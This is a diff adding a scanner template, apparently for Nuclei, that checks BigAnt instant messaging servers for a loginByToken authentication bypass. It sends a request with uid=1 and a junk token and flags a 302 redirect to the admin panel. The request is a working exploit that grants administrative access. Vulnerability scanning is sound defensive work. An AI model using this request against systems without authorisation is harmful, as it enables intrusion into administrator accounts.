@@ -1,0 +1,24 @@
+id: damayi-loginByToken-bypass
+
+info:
+  name: 大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞
+  author: damayi
+  severity: high
+  tags: damayi
+
+http:
+  - raw:
+      - |+
+        GET /home/login/loginByToken?uid=1&token=asdasdasdadasadad HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '/Admin/index/index'
+      - type: status
+        status:
+          - 302
